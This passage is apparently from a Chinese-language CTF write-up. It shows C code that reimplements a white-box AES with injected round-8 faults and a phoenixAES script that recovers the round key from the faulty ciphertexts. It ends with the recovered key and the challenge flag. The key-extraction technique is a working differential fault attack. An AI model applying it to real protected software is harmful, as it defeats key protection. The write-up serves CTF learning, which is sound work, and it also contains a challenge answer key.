  getXorTable(xortable);

  for (int i = 0; i < 9; i++) {
    if (isDFA && i == 8 ) {
      srand(index);
      input[index] = rand() % 256;
    }
    shiftRows(input);

    for (int j = 0; j < 4; j++) {
      a = tyibox[i][4 * j + 0][input[4 * j + 0]];
      b = tyibox[i][4 * j + 1][input[4 * j + 1]];
      c = tyibox[i][4 * j + 2][input[4 * j + 2]];
      d = tyibox[i][4 * j + 3][input[4 * j + 3]];
      aa = xortable[(a >> 28) & 0xf][(b >> 28) & 0xf];
      bb = xortable[(c >> 28) & 0xf][(d >> 28) & 0xf];
      cc = xortable[(a >> 24) & 0xf][(b >> 24) & 0xf];
      dd = xortable[(c >> 24) & 0xf][(d >> 24) & 0xf];
      input[4 * j + 0] = ((aa ^ bb) << 4) | (cc ^ dd);
      aa = xortable[(a >> 20) & 0xf][(b >> 20) & 0xf];
      bb = xortable[(c >> 20) & 0xf][(d >> 20) & 0xf];
      cc = xortable[(a >> 16) & 0xf][(b >> 16) & 0xf];
      dd = xortable[(c >> 16) & 0xf][(d >> 16) & 0xf];
      input[4 * j + 1] = ((aa ^ bb) << 4) | (cc ^ dd);
      aa = xortable[(a >> 12) & 0xf][(b >> 12) & 0xf];
      bb = xortable[(c >> 12) & 0xf][(d >> 12) & 0xf];
      cc = xortable[(a >> 8) & 0xf][(b >> 8) & 0xf];
      dd = xortable[(c >> 8) & 0xf][(d >> 8) & 0xf];
      input[4 * j + 2] = ((aa ^ bb) << 4) | (cc ^ dd);
      aa = xortable[(a >> 4) & 0xf][(b >> 4) & 0xf];
      bb = xortable[(c >> 4) & 0xf][(d >> 4) & 0xf];
      cc = xortable[a & 0xf][b & 0xf];
      dd = xortable[c & 0xf][d & 0xf];
      input[4 * j + 3] = ((aa ^ bb) << 4) | (cc ^ dd);
    }
  }
  shiftRows(input);
  for (int j = 0; j < 16; j++) {
    input[j] = tbox[j][input[j]];
  }
}

int main() {
  unsigned char input1[17] = {0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33};
  aes_encrypt_by_table(input1, 0);
  for (int i = 0 ; i < 16 ; i ++ ) {
    printf("%02x", input1[i]);
  }
  puts("");
  for (int j = 0 ; j < 16 ; j ++ ) {
    unsigned char input[17] = {0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33};
    aes_encrypt_by_table(input, 1);

    for (int i = 0 ; i < 16 ; i ++ ) {
      printf("%02x", input[i]);
    }
    puts("");
    
    index++;
  }
}
```

得到故障数据，用phoneixAES生成轮密钥

```Python
#!/usr/bin/env python3
import phoenixAES

with open('tracefile', 'wb') as t:
    t.write("""
db997e69af7daf43bfadaa94bc68bbef
9b997e69af7daf52bfad4494bc64bbef
db997e93af7d2043bf20aa94a968bbef
db99de69af8aaf43bbadaa94bc68bbfc
db237e69417daf43bfadaa8cbc68c7ef
dbef7e69ef7daf43bfadaac5bc6822ef
b8997e69af7dafd3bfadbc94bc56bbef
db997e69af7daf43bfadaa94bc68bbef
db99f569af4aaf43deadaa94bc68bbf4
db99d669afcaaf43ebadaa94bc68bb00
db4b7e69c07daf43bfadaa86bc68bdef
c0997e69af7dafdcbfad5a94bc03bbef
db997e5baf7d5a43bf22aa943b68bbef
db997ed4af7da743bfc3aa941068bbef
db995969af5aaf437aadaa94bc68bb5f
db057e697a7daf43bfadaa6cbc684cef
a2997e69af7dafd8bfad6694bc18bbef
""".encode('utf8'))

print(phoenixAES.crack_file('tracefile'))
# Last round key #N found:
# 040D08DA68001026F3DC0D68897148B4
```

sus求解第一轮密钥：

![img](3b0f6c59-984f-48fa-9cb7-f8d25f7482c1.png)

44306E5175317830746535616E636830——D0nQu1x0te5anch0

![img](9612a3b1-cd10-43a3-a19c-77e48c3c8c5e.png)

得到flag为DASCTF{FALLEN_FLOWERS_FADE_NONE_CARES}
